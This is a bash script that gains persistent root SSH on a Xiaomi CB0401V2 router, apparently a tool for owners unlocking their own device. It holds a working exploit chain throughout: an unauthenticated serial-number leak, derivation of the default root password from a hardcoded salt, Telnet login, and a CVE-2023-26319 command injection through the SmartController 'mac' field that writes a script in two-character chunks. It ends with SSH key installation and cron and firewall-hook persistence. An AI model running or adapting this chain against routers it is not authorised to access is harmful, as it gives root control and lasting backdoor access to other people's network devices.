#!/bin/bash
#
# open_ssh.sh — opens persistent root SSH on a CB0401V2, without xmir-patcher
# or any Python dependency.
#
# Two paths, tried in order:
#
#   Path A — Telnet (firmware < 3.0.100, the common case):
#     1. api/xqsystem/init_info leaks the serial number (no auth).
#     2. Xiaomi's mkxqimage derives the default root/Telnet password:
#          md5(serial + "6d2df50a-250f-4a30-a5e6-d44fb0960aa0"), first 8 chars
#     3. Log in over Telnet (port 23) with that password.
#     4. Write ssh_patch.sh; set up a cron job + firewall include hook that
#        re-apply it every minute (so SSH survives reboots); install our key.
#
#   Path B — CVE-2023-26319 web exploit (firmware 3.0.100+, Telnet closed):
#     1. Same serial fetch + password derivation as above.
#     2. Log in to the web UI with that password to get a session token (stok).
#     3. Exploit the SmartController `mac` injection: the xqsmarthome
#        request_smartcontroller endpoint passes the `mac` field unsanitised
#        into a 100-byte sprintf() → system() call.  By injecting `;CMD;`, CMD
#        runs as root — up to ~20 chars per call.
#     4. Write the SSH-enable + key-install script to /tmp/e in 2-char chunks
#        via repeated `echo -n "XX">>/tmp/e` injection calls (three HTTP
#        requests each: scene_setting, scene_start_by_crontab, scene_delete).
#     5. Execute the script. Then, once SSH is open, install ssh_patch.sh
#        + cron + firewall hook over the now-available SSH connection.
#
#     Override WEB_PASSWORD if your web-UI password differs from the factory
#     default (both use the same derived default on a factory-fresh router):
#       WEB_PASSWORD=mypassword ./open_ssh.sh
#
# Usage: ./open_ssh.sh [router_ip] [pubkey_file]
#
set -e

ROUTER_IP="${1:-${ROUTER_IP:-192.168.31.1}}"
PUBKEY_FILE="${2:-}"
TELNET_TIMEOUT="${TELNET_TIMEOUT:-8}"
WEB_PASSWORD="${WEB_PASSWORD:-}"

say() { echo "==> $*"; }
die() { echo "ERROR: $*" >&2; exit 1; }

command -v curl >/dev/null 2>&1 || die "curl is required."
command -v bash >/dev/null 2>&1 || die "bash is required."

# --- 1. Fetch the serial number (no auth needed) ----------------------------

say "Fetching device info from $ROUTER_IP..."
INFO_JSON="$(curl -s -m 8 "http://$ROUTER_IP/cgi-bin/luci/api/xqsystem/init_info")"
[ -n "$INFO_JSON" ] || die "No response from the router's web UI. Is it powered on and reachable at $ROUTER_IP?"

SERIAL="$(echo "$INFO_JSON" | grep -o '"id":"[^"]*"' | head -1 | sed 's/"id":"\(.*\)"/\1/')"
HARDWARE="$(echo "$INFO_JSON" | grep -o '"hardware":"[^"]*"' | head -1 | sed 's/"hardware":"\(.*\)"/\1/')"
[ -n "$SERIAL" ] || die "Could not find a serial number in the router's response - this may not be a supported Xiaomi/MiWiFi device, or it isn't in factory state yet (finish the initial setup at http://$ROUTER_IP first)."
say "Device: ${HARDWARE:-unknown} (serial: $SERIAL)"

# --- 2. Derive the default root password ------------------------------------

SALT="6d2df50a-250f-4a30-a5e6-d44fb0960aa0"
if command -v openssl >/dev/null 2>&1; then
  MD5_HEX="$(printf '%s' "${SERIAL}${SALT}" | openssl dgst -md5 -r | awk '{print $1}')"
elif command -v md5sum >/dev/null 2>&1; then
  MD5_HEX="$(printf '%s' "${SERIAL}${SALT}" | md5sum | awk '{print $1}')"
elif command -v md5 >/dev/null 2>&1; then
  MD5_HEX="$(printf '%s' "${SERIAL}${SALT}" | md5 -q)"
else
  die "Need one of: openssl, md5sum, md5 (none found) to derive the default password."
fi
DEFAULT_PASSWORD="${MD5_HEX:0:8}"
say "Derived default root password (from the serial number, not a secret we invented)."

# Web UI uses the same factory default as Telnet. Override with WEB_PASSWORD
# if you've changed the web admin password but not the Telnet/SSH one.
WEB_PASSWORD="${WEB_PASSWORD:-$DEFAULT_PASSWORD}"

# --- 3. Locate and read the SSH public key ----------------------------------

if [ -z "$PUBKEY_FILE" ]; then
  PUBKEY_FILE="$(dirname "${BASH_SOURCE[0]}")/../gui/router_key.pub"
fi
[ -f "$PUBKEY_FILE" ] || die "SSH public key not found at $PUBKEY_FILE. Generate one first: ssh-keygen -t ed25519 -f router_key -N '' -C cb0401-tune-control-gui"
PUBKEY="$(cat "$PUBKEY_FILE")"

# --- Path B: CVE-2023-26319 web exploit (called when Telnet is closed) ------

web_open_ssh() {
  say "Telnet port 23 is closed; trying web exploit (CVE-2023-26319)..."

  # SHA1 hash: Linux (sha1sum) or macOS (shasum).
  if command -v sha1sum >/dev/null 2>&1; then
    _sha1() { sha1sum | awk '{print $1}'; }
  elif command -v shasum >/dev/null 2>&1; then
    _sha1() { shasum -a 1 | awk '{print $1}'; }
  else
    die "sha1sum or shasum is required for the web login (not found)."
  fi

  # Escape \ and " for safe embedding in a JSON string value.
  _json_escape() { printf '%s' "$1" | sed 's/\\/\\\\/g; s/"/\\"/g'; }

  # --- Web login → stok -------------------------------------------------------

  say "Logging in to the web UI at http://$ROUTER_IP ..."
  _page=$(curl -s -m 10 "http://$ROUTER_IP/cgi-bin/luci/web") \
    || die "Could not reach the router web UI."
  _key=$(printf '%s' "$_page" | grep -o "key: '[^']*'"       | head -1 | sed "s/key: '//;s/'.*//")
  _did=$(printf '%s' "$_page" | grep -o "deviceId = '[^']*'" | head -1 | sed "s/.*deviceId = '//;s/'.*//")
  [ -n "$_key" ] || die "Couldn't parse the login key from the web UI. Wrong IP or unsupported firmware."

  _ts=$(date +%s)
  _rnd=$(( RANDOM % 10000 ))
  _nonce="0_${_did}_${_ts}_${_rnd}"
  _account=$(printf '%s%s' "$WEB_PASSWORD" "$_key" | _sha1)
  _logdata=$(printf '%s%s' "$_nonce" "$_account"   | _sha1)

  _resp=$(curl -s -m 10 -X POST \
    "http://$ROUTER_IP/cgi-bin/luci/api/xqsystem/login" \
    --data-urlencode "username=admin" \
    --data-urlencode "logData=$_logdata" \
    --data-urlencode "nonce=$_nonce")
  _stok=$(printf '%s' "$_resp" | grep -o '"token":"[^"]*"' | head -1 | sed 's/.*"token":"//;s/".*//')
  [ -n "$_stok" ] || die "Web login failed (wrong WEB_PASSWORD?). Response: $_resp"
  say "Logged in."

  _url="http://$ROUTER_IP/cgi-bin/luci/;stok=${_stok}/api/xqsmarthome/request_smartcontroller"

  # --- Execute a short command via SmartController mac injection ---------------
  # Three HTTP requests per call: scene_setting (creates the scene + injects
  # our command), scene_start_by_crontab (triggers it immediately), scene_delete
  # (cleans up). This follows xmir-patcher's connect5.py implementation exactly.
  _tiny_exec() {
    local _cmd="$1" _r _id _jc
    _jc=$(_json_escape "$_cmd")
    _r=$(curl -s -m 8 -X POST "$_url" \
      -H 'Content-Type: application/json' \
      -d "{\"command\":\"scene_setting\",\"action_list\":[{\"thirdParty\":\"xmrouter\",\"payload\":{\"command\":\"wan_block\",\"mac\":\";${_jc};\"}}],\"launch\":{\"timer\":{\"time\":\"23:59\",\"repeat\":\"0\",\"enabled\":true}}}")
    _id=$(printf '%s' "$_r" | grep -o '"id":[0-9]*' | head -1 | sed 's/"id"://')
    [ -n "$_id" ] || { printf 'WARN: injection failed for: %s\n' "$_cmd" >&2; return 1; }
    curl -s -m 8 -X POST "$_url" -H 'Content-Type: application/json' \
      -d "{\"command\":\"scene_start_by_crontab\",\"id\":${_id}}" >/dev/null
    sleep 0.5
    curl -s -m 8 -X POST "$_url" -H 'Content-Type: application/json' \
      -d "{\"command\":\"scene_delete\",\"id\":${_id}}" >/dev/null
  }

  # Write a script to /tmp/e in 2-char chunks then execute it.
  # Max command length per injection call is ~20 chars; `echo -n "XX">>/tmp/e`
  # is exactly 20, so we write two characters of content per call.
  _exec_on_router() {
    local _s="$1" _i=0 _n _c
    _n=${#_s}
    _tiny_exec "rm -f /tmp/e" || true
    say "Writing ${_n}-char script via injection ($(( (_n+1)/2 )) calls × 3 HTTP requests each)..."
    while [ $_i -lt $_n ]; do
      _c="${_s:$_i:2}"
      _tiny_exec "echo -n \"${_c}\">>/tmp/e"
      _i=$(( _i + 2 ))
    done
    say "Executing /tmp/e on the router..."
    _tiny_exec "sh /tmp/e"
    _tiny_exec "rm -f /tmp/e" || true
  }

  # Bootstrap script written through the injection.
  # Design constraints: no double-quote chars (would break the echo injection
  # syntax); uses unquoted `echo` for the SSH key line (SSH key chars — base64
  # A-Za-z0-9+/= plus the ssh-ed25519 prefix and comment — are not glob-special
  # so unquoted echo is safe and outputs them space-separated correctly).
  _script="mkdir -p /etc/dropbear;nvram set ssh_en=1;nvram commit;sed -i s/release/XXXXXX/g /etc/init.d/dropbear;/etc/init.d/dropbear enable;/etc/init.d/dropbear restart;echo ${PUBKEY}>>/etc/dropbear/authorized_keys;chmod 600 /etc/dropbear/authorized_keys"

  _exec_on_router "$_script"

  say "Waiting for dropbear to start..."
  sleep 4

  # --- Install persistence via the now-open SSH connection --------------------
  _priv="${PUBKEY_FILE%.pub}"
  _sshopts=(-o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa \
            -o StrictHostKeyChecking=no -o ConnectTimeout=8)

  if ! ssh "${_sshopts[@]}" -i "$_priv" "root@$ROUTER_IP" true 2>/dev/null; then
    die "SSH did not open after the exploit. CVE-2023-26319 may be patched on this firmware (try xmir-patcher instead)."
  fi

  say "SSH is up. Installing persistence (ssh_patch.sh + cron + firewall hook) via SSH..."
  ssh "${_sshopts[@]}" -i "$_priv" "root@$ROUTER_IP" sh <<'REMOTE_PERSISTENCE'
mkdir -p /etc/crontabs/patches
cat > /etc/crontabs/patches/ssh_patch.sh <<'SSH_PATCH_EOF'
#!/bin/sh
nvram set ssh_en=1
nvram commit
sed -i s/release/XXXXXX/g /etc/init.d/dropbear
/etc/init.d/dropbear enable
/etc/init.d/dropbear restart
SSH_PATCH_EOF
chmod +x /etc/crontabs/patches/ssh_patch.sh
grep -v "/ssh_patch.sh" /etc/crontabs/root > /etc/crontabs/root.new 2>/dev/null || echo "" > /etc/crontabs/root.new
echo "*/1 * * * * /etc/crontabs/patches/ssh_patch.sh >/dev/null 2>&1" >> /etc/crontabs/root.new
mv /etc/crontabs/root.new /etc/crontabs/root
uci set firewall.auto_ssh_patch=include
uci set firewall.auto_ssh_patch.type='script'
uci set firewall.auto_ssh_patch.path='/etc/crontabs/patches/ssh_patch.sh'
uci set firewall.auto_ssh_patch.enabled='1'
uci commit firewall
REMOTE_PERSISTENCE
}

# --- Path A: Telnet (try first) ---------------------------------------------

say "Connecting to Telnet on $ROUTER_IP:23 ..."
if ! exec 3<>"/dev/tcp/$ROUTER_IP/23" 2>/dev/null; then
  web_open_ssh
  say "Done. SSH is open and this toolkit's key is installed."
  say "Verify with: ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa -i ${PUBKEY_FILE%.pub} root@$ROUTER_IP"
  exit 0
fi

# Reads from fd 3 one byte at a time (no external tools needed) until
# $1 is seen in the accumulated buffer, or $TELNET_TIMEOUT seconds pass.
# This is deliberately dumb about Telnet IAC option negotiation (bash's
# /dev/tcp is a raw socket, it doesn't speak Telnet) - embedded telnetd
# implementations like this router's are normally lenient about a client
# that never responds to negotiation and just waits for plain-text
# prompts, which is all this needs.
tn_expect() {
  local needle="$1" buf="" ch deadline
  deadline=$(( $(date +%s) + TELNET_TIMEOUT ))
  while [ "$(date +%s)" -lt "$deadline" ]; do
    if IFS= read -r -t 1 -N 1 ch <&3; then
      buf+="$ch"
      case "$buf" in
        *"$needle"*) TN_BUF="$buf"; return 0 ;;
      esac
    fi
  done
  TN_BUF="$buf"
  return 1
}

tn_send() { printf '%s\r\n' "$1" >&3; }

PROMPT='# '

if tn_expect 'login:'; then
  tn_send 'root'
  tn_expect 'assword:' || die "Telnet didn't ask for a password after the username - unexpected prompt sequence."
  tn_send "$DEFAULT_PASSWORD"
  tn_expect "$PROMPT" || die "Login with the derived default password was rejected. Either this router's password differs from the documented derivation, or it's already locked down."
elif tn_expect "$PROMPT"; then
  : # some devices drop you straight into a root shell, no login prompt
else
  die "Telnet didn't present a recognizable login or shell prompt within ${TELNET_TIMEOUT}s."
fi

say "Logged in over Telnet. Patching the router..."

tn_send 'mkdir -p /etc/crontabs/patches'
tn_expect "$PROMPT"

# Same "soft" persistence patch as xmir-patcher's install_ssh.py: enable
# dropbear (removing its release-build gate), flip nvram ssh_en, and keep
# re-applying that every minute via cron + a firewall include hook so it
# survives reboots.
tn_send "cat > /etc/crontabs/patches/ssh_patch.sh << 'CB0401_SSH_PATCH_EOF'
#!/bin/sh
LOG_FN=/tmp/ssh_patch.log
[ -e \$LOG_FN ] && return 0
: > \$LOG_FN
SSH_EN=\`nvram get ssh_en\`
if [ \"\$SSH_EN\" != \"1\" ]; then
    nvram set ssh_en=1
    nvram commit
fi
if grep -q '= \"release\"' /etc/init.d/dropbear ; then
    sed -i 's/= \"release\"/= \"XXXXXX\"/g'  /etc/init.d/dropbear
fi
/etc/init.d/dropbear enable
/etc/init.d/dropbear restart
echo \"ssh enabled\" > \$LOG_FN
CB0401_SSH_PATCH_EOF"
tn_expect "$PROMPT"

tn_send 'chmod +x /etc/crontabs/patches/ssh_patch.sh'
tn_expect "$PROMPT"

tn_send 'grep -v "/ssh_patch.sh" /etc/crontabs/root > /etc/crontabs/root.new 2>/dev/null || echo "" > /etc/crontabs/root.new; echo "*/1 * * * * /etc/crontabs/patches/ssh_patch.sh >/dev/null 2>&1" >> /etc/crontabs/root.new; mv /etc/crontabs/root.new /etc/crontabs/root'
tn_expect "$PROMPT"

tn_send "uci set firewall.auto_ssh_patch=include; uci set firewall.auto_ssh_patch.type='script'; uci set firewall.auto_ssh_patch.path='/etc/crontabs/patches/ssh_patch.sh'; uci set firewall.auto_ssh_patch.enabled='1'; uci commit firewall"
tn_expect "$PROMPT"

tn_send 'rm -f /tmp/ssh_patch.log; sh /etc/crontabs/patches/ssh_patch.sh'
tn_expect "$PROMPT"

say "Installing this toolkit's SSH key..."
tn_send "mkdir -p /etc/dropbear; grep -qF '$PUBKEY' /etc/dropbear/authorized_keys 2>/dev/null || echo '$PUBKEY' >> /etc/dropbear/authorized_keys; chmod 600 /etc/dropbear/authorized_keys"
tn_expect "$PROMPT"

tn_send 'exit'
exec 3<&- 3>&- 2>/dev/null || true

say "Done. SSH should now be enabled and this toolkit's key installed."
say "Verify with: ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa -i ${PUBKEY_FILE%.pub} root@$ROUTER_IP"
